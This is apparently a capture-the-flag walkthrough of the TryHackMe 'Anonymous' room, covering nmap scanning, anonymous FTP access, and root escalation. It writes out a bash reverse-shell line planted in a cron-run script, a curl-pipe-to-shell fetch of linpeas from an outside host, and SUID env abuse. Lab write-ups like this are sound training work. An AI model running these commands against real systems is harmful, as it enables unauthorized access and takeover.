## Anonymous | TryHackMe

This is the link for the room [Anonymous](https://tryhackme.com/room/anonymous)

<img src="https://user-images.githubusercontent.com/67650329/214474313-96ed4e22-4432-4a7f-af21-c9e3dc5d97bc.png" width="250px" align="center">

---
Not the hacking group.

Let's Go.

`nmap -sC -sV -p- -T4 {IP}`

- -sC = Run the default script.
- -sV = Version of services.
- -p- = Checking for all port.
- -T4 = Scanning speed.

This is the result for the scanning with nmap tools.

```
PORT	STATE SERVICE 	REASON  VERSION
21/tcp  open  ftp     	syn-ack vsftpd 2.0.8 or later
***
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx	2 111  	113      	4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh     	syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
***
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time:
|   date: 2023-01-09T09:59:39
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 31568/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 52311/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 24358/udp): CLEAN (Failed to receive data)
|   Check 4 (port 37087/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ANONYMOUS<00>    	Flags: <unique><active>
|   ANONYMOUS<03>    	Flags: <unique><active>
|   ANONYMOUS<20>    	Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>    	Flags: <group><active>
|   WORKGROUP<1d>    	Flags: <unique><active>
|   WORKGROUP<1e>    	Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_	Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2023-01-09T09:59:39+00:00
```

Port open:

- 21 = FTP.
- 22 = SSH.
- 139 = netbios.
- 445 = netbios.

As we can see open port 21 FTP says:
```
21/tcp  open  ftp     	syn-ack vsftpd 2.0.8 or later
***
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx	2 111  	113      	4096 Jun 04  2020 scripts [NSE: writeable]
```
ftp Anonymous FTP login allowed. So we can use the ftp with anonymous user.

`ftp [IP_Target]`

```
Connected to Target.
220 NamelessOne's FTP Server!
Name (Target:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||52432|)
150 Here comes the directory listing.
drwxrwxrwx	2 111  	113      	4096 Jun 04  2020 scripts
226 Directory send OK.
```
We are into the ftp machine. 

We can see on ftp we got the folder scripts. 

We can get in to the scripts folder.

```
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||38352|)
150 Here comes the directory listing.
-rwxr-xrwx	1 1000 	1000      	314 Jun 04  2020 clean.sh
-rw-rw-r--	1 1000 	1000     	1247 Jan 09 10:06 removed_files.log
-rw-r--r--	1 1000 	1000       	68 May 12  2020 to_do.txt
226 Directory send OK.
```
And now we can see the 3 files on scripts folder (clean.sh, removed_files.log & to_do_txt)

We can download the 3 files on this scripts folder.

```
ftp> mget *
mget clean.sh [anpqy?]?
229 Entering Extended Passive Mode (|||12870|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |*******************************|   314  	110.62 KiB/s	00:00 ETA
226 Transfer complete.
314 bytes received in 00:00 (1.54 KiB/s)
mget removed_files.log [anpqy?]?
229 Entering Extended Passive Mode (|||50223|)
150 Opening BINARY mode data connection for removed_files.log (1247 bytes).
100% |*******************************|  1247   	20.86 MiB/s	00:00 ETA
226 Transfer complete.
1247 bytes received in 00:00 (6.24 KiB/s)
mget to_do.txt [anpqy?]?
229 Entering Extended Passive Mode (|||59539|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |*******************************|	68  	657.48 KiB/s	00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.33 KiB/s)
```
Ok!. After we download the files, We can open the files one by one.

```
└─$ cat clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    	echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
	for LINE in $tmp_files; do
    	rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
```
└─$ cat removed_files.log
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
***
```
```
└─$ cat to_do.txt   	 
I really need to disable the anonymous login...it's really not safe
```
After that we can see the clean.sh. We can replace the clean.sh with our shell on [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

And after we change the file with our code. Now we must replace the file on ftp with our code file.

Before we replace it. Don't forget to run the listener using netcat.

`nc -lvnp [Port]

```
ftp> put clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||55931|)
150 Ok to send data.
100% |*******************************|	54  	878.90 KiB/s	00:00 ETA
226 Transfer complete.
54 bytes sent in 00:00 (0.13 KiB/s)
```
After we put the file into the ftp machine.

The listener automated run into the machine ssh machine.

```
listening on [any] 4444 ...
connect to [Target] from (UNKNOWN) [10.10.212.113] 54920
bash: cannot set terminal process group (1368): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ ls
ls
pics
user.txt
namelessone@anonymous:~$ cat user.txt
cat user.txt
```
After we got the user the next step it's we must find the root.

I think we can use the linpeas first.

```
namelessone@anonymous:~$ curl 10.8.8.39/linpeas.sh | sh

-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env
```
On the linpeas we got the edited file on env folder.

We can exploit the env with [gtfo](https://gtfobins.github.io/gtfobins/env/)

```
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
whoami
root
cat /root/root.txt
```
And BOOM! We got the root.

---
